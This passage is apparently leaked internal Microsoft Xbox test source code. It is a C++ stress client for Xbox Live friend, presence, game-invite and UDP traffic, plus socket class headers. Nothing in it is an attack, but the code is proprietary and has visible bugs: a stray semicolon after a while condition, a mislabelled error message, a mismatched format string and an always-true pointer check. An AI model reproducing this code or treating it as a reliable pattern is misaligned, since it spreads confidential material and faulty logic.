		| XONLINE_FRIENDSTATE_FLAG_JOINABLE);
	// And make sure the state flags still say that we're online
	dwRandomStateFlags |= XONLINE_FRIENDSTATE_FLAG_ONLINE;

	if(!XOnlineNotificationSetState(dwUserDieRoll, dwRandomStateFlags, *pCurrentSession, cbData, pData))
	{
		TRACE(g_hLog, "Failed to set presence state");
		hr = E_FAIL;
		goto Exit;
	}

	++g_dwPresenceStateChangeCount;

Exit:

	if(pData)
		delete [] pData;

	return hr;
}

/****************************************************************************
 *
 *  GameInviteChange
 *
 *  Description:
 *      Changes the presence status for a random user
 *
 *  Arguments:
 *      CFriendOpTask    *pFriendOpTask     Pointer to friend operation task for performing
 *                                          game invite operations
 *      CFriendEnumTask  *pFriendEnumArray  Array of friend enumeration tasks.  Used to access
 *                                          users friends for issuing game invites
 *      XNKID            *pSessionID        Session ID of the current session
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT GameInviteChange(CFriendOpTask *pFriendOpTask, CFriendEnumTask *pFriendEnumArray, XNKID *pSessionID)
{
	XONLINE_GAMEINVITE_ANSWER_TYPE Answer = XONLINE_GAMEINVITE_NO;
	HRESULT hr = S_OK;
	DWORD dwUserDieRoll = (rand() % XONLINE_MAX_LOGON_USERS), dwActionDieRoll = (rand() % 100);
	XONLINE_FRIEND TargetFriend;

	if(!PickFriendForAction(pFriendEnumArray + dwUserDieRoll, NULL))
	{
		goto Exit;
	}

	// If we've received an invite, but haven't responded to it yet, do so
	if(PickInvitingFriendForAction(pFriendEnumArray + dwUserDieRoll, &TargetFriend))
	{
		// We have an 80% chance of handling an incoming invite
		if(dwActionDieRoll < 80)
		{
			// Roll the die again
			dwActionDieRoll = (rand() % 100);

			// We have a 50% chance of accepting the game invite
			if(dwActionDieRoll < 50)
				Answer = XONLINE_GAMEINVITE_YES;
			// We have a 50% chance of rejecting the game invite
			else
				Answer = XONLINE_GAMEINVITE_NO;

			if(!pFriendOpTask->AnswerGameInvite(dwUserDieRoll, &TargetFriend, Answer))
			{
				TRACE(g_hLog, "Failed to answer game invite");
				hr = E_FAIL;
				goto Exit;
			}

			if(Answer == XONLINE_GAMEINVITE_YES)
			{
				++g_dwFriendGameInviteAcceptCount;
//				TRACE(g_hLog, "Accepted game invite from %S", TargetFriend.username);
			}
			else
			{
				++g_dwFriendGameInviteRejectCount;
//				TRACE(g_hLog, "Rejected game invite from %S", TargetFriend.username);
			}

			goto Exit;
		}
		//Otherwise, we'll fall through to invite a new friend to a game
	}
	// If we've issued an invite, act accordingly
	else if(PickInvitedFriendForAction(pFriendEnumArray + dwUserDieRoll, &TargetFriend))
	{
		// We have an 20% chance of revoking an existing invite
		if(dwActionDieRoll < 20)
		{
			if(!pFriendOpTask->RevokeGameInvite(dwUserDieRoll, *pSessionID, 1, &TargetFriend))
			{
				TRACE(g_hLog, "Failed to revoke game invite");
				hr = E_FAIL;
				goto Exit;
			}
			
			++g_dwFriendGameInviteRevokeCount;

//			TRACE(g_hLog, "Revoked game invite to  %S", TargetFriend.username);

			goto Exit;
		}
		//Otherwise, we'll fall through to invite a new friend to a game
	}

	// If none of the previous actions were taken, then issue a new game invite
	if(!PickFriendForAction(pFriendEnumArray + dwUserDieRoll, &TargetFriend))
	{
		TRACE(g_hLog, "Failed to pick a user to invite to a game");
		hr = E_FAIL;
		goto Exit;
	}

	if(!pFriendOpTask->GameInvite(dwUserDieRoll, *pSessionID, 1, &TargetFriend))
	{
		TRACE(g_hLog, "Failed to revoke game invite");
		hr = E_FAIL;
		goto Exit;
	}

	++g_dwFriendGameInviteCount;

//	TRACE(g_hLog, "Issued game invite to  %S", TargetFriend.username);

Exit:

	return hr;
}

/****************************************************************************
 *
 *  CreateClientUDPSocket
 *
 *  Description:
 *      Creates a UDP socket and binds it to a specific port
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      INVALID_SOCKET on failure
 *      Valid socket handle on success
 *
 ****************************************************************************/
SOCKET CreateClientUDPSocket()
{
	SOCKET ClientSocket = INVALID_SOCKET;
    SOCKADDR_IN	LocalSockAddr = { AF_INET };
	DWORD dwNonBlocking = TRUE;

	// Create the socket
	ClientSocket = socket(AF_INET, SOCK_DGRAM, 0);
	if(ClientSocket == INVALID_SOCKET)
	{
		TRACE(g_hLog, "Socket creation failed with 0x%08x", WSAGetLastError());
		goto Exit;
	}

	// Create the socket	
	if(ioctlsocket(ClientSocket, FIONBIO, &dwNonBlocking) == SOCKET_ERROR)
	{
		TRACE(g_hLog, "Setting for non-blocking IO failed with 0x%08x", WSAGetLastError());
		goto Exit;
	}

    LocalSockAddr.sin_port = htons(XONSTRESS_HOST_PORT);
    LocalSockAddr.sin_addr.s_addr = INADDR_ANY;
	
	// Bind the socket to the local address
    if (bind(ClientSocket, (const struct sockaddr *) &LocalSockAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
		TRACE(g_hLog, "Socket binding failed with 0x%08x", WSAGetLastError());
		goto Exit;
    }

Exit:

	return ClientSocket;
}

/****************************************************************************
 *
 *  SendUDPPacketToRandomClient
 *
 *  Description:
 *      Picks a client at random and sends an IP datagram to it
 *
 *  Arguments:
 *      SOCKET                   ClientSocket       Socket to send the datagram from
 *      XNKID                    *pSessionID        XNKID of this session
 *      XONSTRESS_CLIENTVECTOR   *pClientVector     Pointer to the list of clients and users in the session
 *
 *  Returns:  
 *      TRUE on successful send
 *      FALSE on any failure other than WSAEWOULDBLOCK
 *
 ****************************************************************************/
BOOL SendUDPPacketToRandomClient(SOCKET ClientSocket, XNKID *pSessionID, XONSTRESS_CLIENTVECTOR *pClientVector)
{
	XNADDR TargetXnAddr, LocalXnAddr;
	SOCKADDR_IN TargetSockAddr;
	DWORD dwNumClients = pClientVector->size();
	DWORD dwTargetClientIndex = 0;
	CHAR szPacketBuff[256];
	INT cbPacketSize = (rand() % 256), nCurrentByte = 0, nBytesSent = 0;
	BOOL fRet = TRUE;

	// This should only happen if we haven't gotten the client list from the host yet
	if(!dwNumClients)
		return TRUE;

	// Randomly pick a target client
	dwTargetClientIndex = (rand() % dwNumClients);

	TargetSockAddr.sin_family = AF_INET;
	TargetSockAddr.sin_port = htons(XONSTRESS_HOST_PORT);

	if(!(XNetGetTitleXnAddr(&LocalXnAddr) & XNET_GET_XNADDR_ONLINE))
	{
		TRACE(g_hLog, "Error retrieving title XNADDR");
        fRet = FALSE;
        goto Exit;
	}

	// Don't send to ourselves
	if(!(memcmp(&LocalXnAddr, &(((*pClientVector)[dwTargetClientIndex]).m_ClientAddr), sizeof(XNADDR))))
	{
		fRet = TRUE;
		goto Exit;
	}

	// Get the address information
	if(XNetXnAddrToInAddr(&(((*pClientVector)[dwTargetClientIndex]).m_ClientAddr), pSessionID, &(TargetSockAddr.sin_addr)))
	{
		// Allow failure here, because this may be due to network conditions
		TRACE(g_hLog, "Error getting a private INADDR from host's XNADDR");
		fRet = TRUE;
		goto Exit;
	}

	// Generate the random data
	for(nCurrentByte = 0;nCurrentByte < cbPacketSize; ++nCurrentByte)
	{
		szPacketBuff[nCurrentByte] = (CHAR) (rand() & 0x000000FF);
	}

	nBytesSent = sendto(ClientSocket, szPacketBuff, cbPacketSize, 0, (sockaddr *) &TargetSockAddr, sizeof(TargetSockAddr));
	if(nBytesSent == SOCKET_ERROR)
	{
		if(WSAGetLastError() != WSAEWOULDBLOCK)
		{
			TRACE(g_hLog, "Unexpected error on UDP socket send 0x%08x", WSAGetLastError());
			fRet = FALSE;
			goto Exit;
		}
	}

	g_qwBytesSent += nBytesSent;

Exit:
	return fRet;
}

/****************************************************************************
 *
 *  ReceiveUDPData
 *
 *  Description:
 *      Checks the given socket for any incoming datagrams and reads them
 *
 *  Arguments:
 *      SOCKET                   ClientSocket       Socket to recv datagrams from
 *
 *  Returns:  
 *      TRUE on success
 *      FALSE on failure unexpected socket error
 *
 ****************************************************************************/
BOOL ReceiveUDPData(SOCKET ClientSocket)
{
	COnlineTimer ReadTimer;
	CHAR szPacketBuff[256];
	TIMEVAL sTimeout = {0, 0}; 
	FD_SET readfds;
	BOOL fRet = TRUE;
	INT nActiveSockets = 0, nBytesReceived = 0;

	ReadTimer.SetAllowedTime(5);

	FD_ZERO(&readfds);
	FD_SET(ClientSocket, &readfds);

	nActiveSockets = select(0, &readfds, NULL, NULL, &sTimeout);

	while((nActiveSockets > 0) && (!ReadTimer.HasTimeExpired()));
	{
		nBytesReceived = recvfrom(ClientSocket, (char *) szPacketBuff, sizeof(szPacketBuff), 0, NULL, NULL);
		if(nBytesReceived == SOCKET_ERROR)
		{
			if(WSAGetLastError() != WSAEWOULDBLOCK)
			{
				TRACE(g_hLog, "Unexpected error on UDP socket recv 0x%08x", WSAGetLastError());
				fRet = FALSE;
			}

			goto Exit;
		}
		g_qwBytesReceived += nBytesReceived;

		FD_ZERO(&readfds);
		FD_SET(ClientSocket, &readfds);
		
		nActiveSockets = select(0, &readfds, NULL, NULL, &sTimeout);
	}

Exit:

	return fRet;
}

/****************************************************************************
 *
 *  FindValidHostSession
 *
 *  Description:
 *      Loop through all of the returned search results and try connecting to each
 *      until one replies or we have exhausted them all
 *
 *  Arguments:
 *      CMatchSearchTask      *pMatchSearchTask  Pointer to a match search task that has results
 *      CClientConnection     **ppClientConn     Used to pass back a client connection object
 *                                               which allows the client to communicate with the host
 *      XNKID                 *pSessionID        Returns the key ID of the host connected to
 *
 *  Returns:  
 *      S_OK on success
 *      S_FALSE if all hosts were tried but none responded
 *      E_FAIL on an unexpected socket failure
 *
 ****************************************************************************/
HRESULT FindValidHostSession(CMatchSearchTask *pMatchSearchTask, CClientConnection **ppClientConn, XNKID *pSessionID)
{
	PXMATCH_SEARCHRESULT *rgpSearchResults = NULL;
	XNADDR HostAddress;
	XNKEY KeyExchangeKey;
	HRESULT hr = S_OK;
	DWORD dwAvailableResults = 0, dwCurrentResult = 0;
	BOOL fConnectedToHost = FALSE;

	if(!pSessionID || !ppClientConn)
	{
		TRACE(g_hLog, "Invalid params");
		goto Exit;
	}

	// Retrieve the search results
	hr = pMatchSearchTask->GetSearchResults(&rgpSearchResults, &dwAvailableResults);
	if(hr != S_OK)
	{
		TRACE(g_hLog, "Failed getting search results: 0x%08x", hr);
		goto Exit;
	}

	// Loop through the search results and try connecting to each host
	for(dwCurrentResult = 0;(dwCurrentResult < dwAvailableResults) && (!fConnectedToHost);++dwCurrentResult)
	{
		// Return all of the info needed to connect to this session
		memcpy(&HostAddress, &((rgpSearchResults[dwCurrentResult])->HostAddress), sizeof(XNADDR));
		memcpy(pSessionID, &((rgpSearchResults[dwCurrentResult])->SessionID), sizeof(XNKID));
		memcpy(&KeyExchangeKey, &((rgpSearchResults[dwCurrentResult])->KeyExchangeKey), sizeof(XNKEY));

		//
		// Register the host's key information
		//
		if(XNetRegisterKey(pSessionID, &KeyExchangeKey))
		{
			TRACE(g_hLog, "Failed registering key");
			hr = E_FAIL;
			goto Exit;
		}
		
		//
		// Create a socket to connect to the session host
		//
		*ppClientConn = new CClientConnection;
		if(!*ppClientConn)
		{
			TRACE(g_hLog, "Failed creating client connection");
			hr = E_FAIL;
			goto Exit;
		}
		
		hr = CreateClientConnectionToHost(*ppClientConn, &HostAddress, pSessionID);
		if(hr != S_OK)
		{
			XNetUnregisterKey(pSessionID);
			delete *ppClientConn;
			*ppClientConn = NULL;
			continue;
		}

		fConnectedToHost = TRUE;
	}

	if(fConnectedToHost)
		hr = S_OK;

Exit:

	if(FAILED(hr) && *ppClientConn)
		delete *ppClientConn;

	return hr;
}

/****************************************************************************
 *
 *  client_Main
 *
 *  Description:
 *      Master algorithm for the online stress client
 *
 *  Arguments:
 *      CMatchSearchTask      *pMatchSearchTask   Pointer to a match search task that has results
 *
 *  Returns:  
 *      S_OK on success

 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT client_Main(CMatchSearchTask *pMatchSearchTask)
{
	COnlineTimer FriendEnumTimer, FriendActionTimer, StatsTimer, SendTimer;
	CFriendOpTask FriendOpTask;
	CFriendEnumTask FriendEnumArray[XONLINE_MAX_LOGON_USERS];
	XONSTRESS_CLIENTVECTOR ClientVector;
	CClientConnection *pClientConnection = NULL;
	XNKID SessionID;
	HRESULT hr = S_OK;
	SOCKET ClientSocket = INVALID_SOCKET;
	DWORD dwCurrentUser = 0, LastFriendCountArray[XONLINE_MAX_LOGON_USERS], dwNewFriendCount = 0, dwDieRoll = 0;

	//
	// Loop through the available sessions and try to connect to each
	//
	hr = FindValidHostSession(pMatchSearchTask, &pClientConnection, &SessionID);
	if(hr != S_OK)
	{
		TRACE(g_hLog, "No valid sessions found");
		hr = E_FAIL;
		goto Exit;
	}

	// Create enumeration handles for all users
	for(dwCurrentUser = 0;dwCurrentUser < XONLINE_MAX_LOGON_USERS;++dwCurrentUser)
	{
		LastFriendCountArray[dwCurrentUser] = 0;
		FriendEnumArray[dwCurrentUser].RegisterLogHandle(g_hLog);
		FriendEnumArray[dwCurrentUser].SetUserIndex(dwCurrentUser);
		XOnlineNotificationSetState(dwCurrentUser, XONLINE_FRIENDSTATE_FLAG_ONLINE, SessionID, 0, NULL);
		if(!FriendEnumArray[dwCurrentUser].StartTask())
		{
			TRACE(g_hLog, "Failed starting friend enumeration task for user at index %u", dwCurrentUser);
			hr = E_FAIL;
			goto Exit;
		}
	}

	// Create a friend operation task
	FriendOpTask.RegisterLogHandle(g_hLog);
	if(!FriendOpTask.StartTask())
	{
		TRACE(g_hLog, "Failed starting friend operation task");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Create a socket entry for the local listening socket
	//
	hr = SendClientInfoToServer(pClientConnection);
	if(hr != S_OK)
		goto Exit;

	//
	// Create local UDP socket
	//
	ClientSocket = CreateClientUDPSocket();
	if(ClientSocket == INVALID_SOCKET)
	{
		TRACE(g_hLog, "Failed creating socket");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Start main client loop
	// 

	SendTimer.SetAllowedTime(100);
	SendTimer.Start();
	StatsTimer.SetAllowedTime(60000);
	StatsTimer.Start();
	FriendActionTimer.SetAllowedTime(XONSTRESS_FRIEND_ACTION_INTERVAL);
	FriendActionTimer.Start();

	while(SUCCEEDED(hr) && !g_fExitTest)
	{
		//
		// Check for client list updates and heartbeats from the host
		//
		hr = ProcessNewInfoFromHost(pClientConnection, &ClientVector);
		// Expect either S_OK or S_FALSE if there wasn't a network error
		if(FAILED(hr))
		{
			// If an error occurred in this phase, the client must exit
			goto Exit;
		}
		
		//
		// Send heartbeats if necessary
		//
		hr = SendClientHeartbeat(pClientConnection);
		if(hr != S_OK)
			goto Exit;
		
		//
		// Update friend lists if necessary
		//

		FriendEnumTimer.SetAllowedTime(XONSTRESS_MAX_ENUM_TIME);
			
		for(dwCurrentUser = 0;dwCurrentUser < XONLINE_MAX_LOGON_USERS;++dwCurrentUser)
		{
			FriendEnumTimer.Start();
			while(!FriendEnumTimer.HasTimeExpired())
			{
				if(FAILED(hr = FriendEnumArray[dwCurrentUser].TaskContinue()))
				{
					TRACE(g_hLog, "Failed pumping friend enumeration task with 0x%08x", hr);
					hr = E_FAIL;
					goto Exit;
				}
			}

			dwNewFriendCount = FriendEnumArray[dwCurrentUser].GetLatestFriendList(NULL);
			if(dwNewFriendCount != LastFriendCountArray[dwCurrentUser])
			{
				++g_dwFriendListChangeCount;

//				TRACE(g_hLog, "User at index %u now has %u friends", dwCurrentUser, dwNewFriendCount);
				LastFriendCountArray[dwCurrentUser] = dwNewFriendCount;
			}
		}


		//
		// Run client tests (start by checking for incoming connections from other clients)
		//

		srand(time(NULL));
		
		dwDieRoll = (rand() % 100);
		// 15% of the time, make a buddy list change
		if(dwDieRoll < 15)
		{
			// The FriendActionTimer prevents us from swamping the underlying friend op task
			if(FriendActionTimer.HasTimeExpired())
			{
				hr = FriendListChange(&FriendOpTask, FriendEnumArray, &ClientVector);
				if(FAILED(hr))
				{
					TRACE(g_hLog, "Failed making buddy list change");
					hr = E_FAIL;
					goto Exit;
				}

				FriendActionTimer.Start();
			}
		}
		// 15% of the time, make a presence status change
		else if(dwDieRoll < 30)
		{
			hr = PresenceStatusChange(&SessionID);
			if(FAILED(hr))
			{
				TRACE(g_hLog, "Failed making presence status change");
				hr = E_FAIL;
				goto Exit;
			}
		}
		// 15% of the time make or accept a game invitation
		else if(dwDieRoll < 45)
		{
			// The FriendActionTimer prevents us from swamping the underlying friend op task
			if(FriendActionTimer.HasTimeExpired())
			{
				hr = GameInviteChange(&FriendOpTask, FriendEnumArray, &SessionID);
				if(FAILED(hr))
				{
					TRACE(g_hLog, "Failed performing a game invite function");
					hr = E_FAIL;
					goto Exit;
				}

				FriendActionTimer.Start();
			}
		}
		// 5% of the time make a lockout list change
//		else if(dwDieRoll < 50)
//		{
//
//		}

		
		// Process friend operations
		hr = FriendOpTask.TaskContinue();
		if(FAILED(hr))
		{
			TRACE(g_hLog, "Failed pumping friend operation task");
			hr = E_FAIL;
			goto Exit;
		}

		// Look for incoming datagrams
		if(!ReceiveUDPData(ClientSocket))
		{
			TRACE(g_hLog, "Failed receiving UDP datagrams");
			hr = E_FAIL;
			goto Exit;
		}
	
		if(SendTimer.HasTimeExpired())
		{
			if(!SendUDPPacketToRandomClient(ClientSocket, &SessionID, &ClientVector))
			{
				TRACE(g_hLog, "Failed sending UDP datagram");
				hr = E_FAIL;
				goto Exit;
			}

			SendTimer.Start();
		}

		// Process lockout operations


		// Process ongoing match session stuff


		// Print data statistics
		if(StatsTimer.HasTimeExpired())
		{
			++g_dwMinuteCounter;
			TRACE(g_hLog, "Stress stats: (after %u minutes)", g_dwMinuteCounter);
			TRACE(g_hLog, "  Data:     %I64u sent, %I64u received", g_qwBytesSent, g_qwBytesReceived);
			TRACE(g_hLog, "  Friends:  %u requests, %u accepts, %u rejects, %u removes, %u list changes",
				g_dwFriendRequestCount, g_dwFriendAcceptCount, g_dwFriendRejectCount, g_dwFriendRemoveCount, g_dwFriendListChangeCount);
			TRACE(g_hLog, "  Invites:  %u invites, %u accepts, %u rejects",
				g_dwFriendGameInviteCount, g_dwFriendGameInviteAcceptCount, g_dwFriendGameInviteRejectCount, g_dwFriendGameInviteRevokeCount);
			TRACE(g_hLog, "  Presence: %u state changes issued", g_dwPresenceStateChangeCount);

			StatsTimer.Start();
		}

		PUMPLOGONHANDLE();
		Sleep(5);
	}

Exit:

	if(&SessionID)
		XNetUnregisterKey(&SessionID);

	if(ClientSocket != INVALID_SOCKET)
	{
		closesocket(ClientSocket);
	}

	pClientConnection ? delete pClientConnection : 0;

    //
    // Return the Hresult
    //

    return hr;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\ListenSocket.h ===
// ListenSocket.h: interface for the CListenSocket class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>

// Defines the maximum simultaneous incoming client connection requests allowed
#define MAX_CONNECTION_BACKLOG 5 

class CListenSocket  
{
public:
	void UnregisterKey();
	HRESULT AcceptIncomingClient(SOCKET *pSocket, IN_ADDR *pInAddr, XNADDR *pXnAddr, XNKID *pXnKid);
	HRESULT StartListening(WORD wPort);
	HRESULT IsConnectionPending();
	HRESULT RegisterKey(XNKID *pSessionID, XNKEY *pKeyExchangeKey);
	CListenSocket();
	virtual ~CListenSocket();

protected:
	SOCKET m_ListenSocket;
	BOOL m_fListening;
	XNKID *m_pSessionID;
	XNKEY *m_pKeyExchangeKey;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\HostSocket.h ===
// HostSocket.h: interface for the CHostSocket class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>

// Defines the maximum simultaneous incoming client connection requests allowed
#define MAX_CONNECTION_BACKLOG 5 

class CHostSocket  
{
public:
	void UnregisterKey();
	HRESULT AcceptIncomingClient(SOCKET *pSocket, IN_ADDR *pInAddr, XNADDR *pXnAddr, XNKID *pXnKid);
	HRESULT StartListening(WORD wPort);
	HRESULT IsConnectionPending();
	HRESULT RegisterKey(XNKID *pSessionID, XNKEY *pKeyExchangeKey);
	CHostSocket();
	virtual ~CHostSocket();

protected:
	SOCKET m_ListenSocket;
	BOOL m_fListening;
	XNKID *m_pSessionID;
	XNKEY *m_pKeyExchangeKey;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\ListenSocket.cpp ===
// ListenSocket.cpp: implementation of the CListenSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ListenSocket.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CListenSocket::CListenSocket()
{
	m_fListening = FALSE;
	m_pSessionID = NULL;
	m_pKeyExchangeKey = NULL;
	m_ListenSocket = INVALID_SOCKET;
}

CListenSocket::~CListenSocket()
{
	UnregisterKey();
	
	if(m_fListening)
		closesocket(m_ListenSocket);
}

/****************************************************************************
 *
 *  RegisterKey
 *
 *  Description:
 *      Registers security information with the network stack so that the host
 *      can accept incoming connections from clients that saw the session on
 *      the match server
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      S_OK if the key was registered successfully
 *      E_FAIL if an error occured registering the key
 *
 ****************************************************************************/
HRESULT CListenSocket::RegisterKey(XNKID *pSessionID, XNKEY *pKeyExchangeKey)
{
	INT nRegisterRet = 0;

	if(m_pSessionID || m_pKeyExchangeKey)
		return E_FAIL;

	m_pSessionID = pSessionID;
	m_pKeyExchangeKey = pKeyExchangeKey;

	nRegisterRet = XNetRegisterKey(pSessionID, pKeyExchangeKey);

	if((nRegisterRet != 0) && (nRegisterRet != WSAEALREADY))
		return E_FAIL;

	return S_OK;
}

/****************************************************************************
 *
 *  IsConnectionPending
 *
 *  Description:
 *      Return whether or not there are any pending connections available on
 *      the host socket
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      S_OK if there are incoming connections pending
 *      S_FALSE if there are no incoming connections pending
 *      E_FAIL if the API was called incorrectly or a winsock or system error occured
 *
 ****************************************************************************/
HRESULT CListenSocket::IsConnectionPending()
{
	HRESULT hr = S_FALSE;
	INT nActiveSockets = 0;

    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(m_ListenSocket, &readfds);

    fd_set writefds;
    FD_ZERO(&writefds);
    FD_SET(m_ListenSocket, &writefds);

    fd_set exceptfds;
    FD_ZERO(&exceptfds);
    FD_SET(m_ListenSocket, &exceptfds);
    
    TIMEVAL sTimeout = {0, 0}; 

	if(!m_fListening)
		return E_FAIL;

    nActiveSockets = select(0, &readfds, &writefds, &exceptfds, &sTimeout);

    if(nActiveSockets <= 0)
    {
        hr = S_FALSE;
        goto Exit;
    }
                
    if(FD_ISSET(m_ListenSocket, &exceptfds))
    {
        hr = E_FAIL;
        goto Exit;
    }

    if(FD_ISSET(m_ListenSocket, &writefds))
    {
        hr = E_FAIL;
        goto Exit;
    }

    if(!FD_ISSET(m_ListenSocket, &readfds))
    {
        hr = E_FAIL;
        goto Exit;
    }

	hr = S_OK;

Exit:

	return hr;
}

/****************************************************************************
 *
 *  StartListening
 *
 *  Description:
 *      Create a host socket, set it to non-blocking, bind it to a designated port
 *      and begin listening for incoming connections
 *
 *  Arguments:
 *      WORD                wPort               Port to listen for incoming connection
 *                                              requests on
 *
 *  Returns:  
 *      S_OK if the socket was created and is listening
 *      E_FAIL if the API was called incorrectly or a winsock or system error occured
 *
 ****************************************************************************/
HRESULT CListenSocket::StartListening(WORD wPort)
{
	SOCKADDR_IN ListenAddress;
    ULONG uNonBlockParam = TRUE;

	if(m_fListening)
		return TRUE;

	m_ListenSocket = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

	if(m_ListenSocket == INVALID_SOCKET)
		goto Exit;

	if(SOCKET_ERROR == ioctlsocket(m_ListenSocket, FIONBIO, &uNonBlockParam))
		goto Exit;

	ListenAddress.sin_family = AF_INET;
    ListenAddress.sin_port = htons(wPort);
    ListenAddress.sin_addr.s_addr = INADDR_ANY;

	if(SOCKET_ERROR == bind(m_ListenSocket, (struct sockaddr *) &ListenAddress, sizeof(ListenAddress)))
		goto Exit;

	if(SOCKET_ERROR == listen(m_ListenSocket, MAX_CONNECTION_BACKLOG))
		goto Exit;

	m_fListening = TRUE;

Exit:

	if(!m_fListening)
	{
		if(m_ListenSocket != INVALID_SOCKET)
		{
			closesocket(m_ListenSocket);
			m_ListenSocket = INVALID_SOCKET;
		}
	}

	return m_fListening ? S_OK : E_FAIL;
}

/****************************************************************************
 *
 *  AcceptIncomingClient
 *
 *  Description:
 *      Pulls one client off the host socket backlog
 *
 *  Arguments:
 *      SOCKET              *pSocket            Returns the incoming client socket
 *      IN_ADDR             *pInAddr            Returns the locally bound IP of the incoming socket
 *      XNADDR              *pXnAddr            Returns the actual Xbox Online address of the incoming socket
 *
 *  Returns:  
 *      S_OK if the socket successfully accepted
 *      S_FALSE if the API timed out waiting for an incoming connection
 *      E_FAIL if the API was called incorrectly or a winsock or system error occured
 *
 ****************************************************************************/
HRESULT CListenSocket::AcceptIncomingClient(SOCKET *pSocket, IN_ADDR *pInAddr, XNADDR *pXnAddr, XNKID *pXnKid)
{
	SOCKADDR_IN IncomingSockAddr;
	INT nSockAddrSize = sizeof(SOCKADDR_IN);

	if(!pSocket || !m_fListening)
		return E_FAIL;

	if((*pSocket = accept(m_ListenSocket, (struct sockaddr *) &IncomingSockAddr, &nSockAddrSize)) == INVALID_SOCKET)
	{
		if(WSAGetLastError() == WSAEWOULDBLOCK)
			return S_FALSE;

		return E_FAIL;
	}

	if(pInAddr)
		(*pInAddr).S_un.S_addr = IncomingSockAddr.sin_addr.S_un.S_addr;

	if(pXnAddr && pXnKid)
	{
		if(XNetInAddrToXnAddr(IncomingSockAddr.sin_addr, pXnAddr, pXnKid))
		{
			closesocket(*pSocket);
			return E_FAIL;
		}
	}

	return S_OK;
}

/****************************************************************************
 *
 *  UnregisterKey
 *
 *  Description:
 *      Unregisters the security information used for the host socket
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      (none)
 *
 ****************************************************************************/
void CListenSocket::UnregisterKey()
{
	if(!m_pSessionID)
		return;

	XNetUnregisterKey(m_pSessionID);

	m_pSessionID = NULL;
	m_pKeyExchangeKey = NULL;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\onlinestress.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       onlinestress.h
 *  Content:    onlinestress utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  12/ 6/01    tristanj Created to test Xbox onlinestress
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xtestlib.h>
#include <xnetref.h>
#include <time.h>
#include "OnlineAccounts.h"
#include "logontask.h"
#include "matchsessioncreatetask.h"
#include "matchsearchtask.h"
#include "friendenumtask.h"
#include "friendoptask.h"
#include "onlinetimer.h"
#include "clientconnection.h"
#include "sessionuser.h"
#include "listensocket.h"

#if defined(NOLOGGING)
#undef LOGTASKINFO
#undef LOGTASKINFOHR
void WINAPI TRACE(HANDLE hLog, LPCSTR szFormat, ...);
#define LOGTASKINFO TRACE
#define LOGTASKINFOHR TRACE
#else
#define TRACE
#endif

#define XONSTRESS_HOST_PORT 1000
#define MAX_NEW_CLIENT_INFO_TIME 10000
#define MAX_SESSION_CREATE_TIME 10000
#define DEFAULT_SLOTS_AVAILABLE 5
#define MAX_LOGON_TIME 30000
#define XONSTRESS_HOST_WAIT_TIME 5000
#define XONSTRESS_MAX_CONNECT_TIME 10000
#define XONSTRESS_MAX_CLIENT_READ_TIME 1000
#define XONLINESTRESS_MAX_MATCH_SEARCH_TIME 30000
#define XONLINESTRESS_MAX_SESSION_DELETE_TIME 10000
#define XONSTRESS_CLIENT_SEND_TIME 500
#define XONSTRESS_HOST_SEND_TIME 500
#define XONSTRESS_CLIENT_RECV_TIME 500
#define XONSTRESS_HOST_RECV_TIME 500
#define XONSTRESS_MAX_ENUM_TIME 5
#define XONSTRESS_FRIEND_ACTION_INTERVAL 3000  // Bump this down later
#define XONSTRESS_SESSION_REFRESH_TIME (15 /*minutes*/ * 60 * 1000)

#define XONLINESTRESS_SEARCH_PROC 128
#define XONLINESTRESS_SESSION_PARAM (X_ATTRIBUTE_SCOPE_GLOBAL | X_ATTRIBUTE_TYPE_SESSION | X_ATTRIBUTE_DATATYPE_INTEGER | 0xAAAA)
#define XONLINESTRESS_SESSION_VALUE 12345
#define XONLINESTRESS_MAX_RESULTS 20
#define XONLINESTRESS_MAX_RESULTS_LEN (XONLINESTRESS_MAX_RESULTS * sizeof(XMATCH_SEARCHRESULT))

#define PUMPLOGONHANDLE() if(FAILED(hr = WaitAndPump(0, g_pLogonTask))) \
{ \
	LOGTASKINFOHR(g_hLog, "Online task handle failed", hr); \
	goto Exit; \
}

HRESULT SendPacket(SOCKET Sock, CHAR *pBuff, INT nSizeToSend, COnlineTimer *pTimer);
HRESULT ReadPacket(SOCKET Socket, CHAR *pBuff, INT nSizeToRead, COnlineTimer *pTimer);
HRESULT ReadNewClientInfo(SOCKET Socket, CClientConnection *pNewClient);
HRESULT CreateListenSocket(CListenSocket **ppListenSocket, XNKID *pSessionID, XNKEY *pKeyExchangeKey);

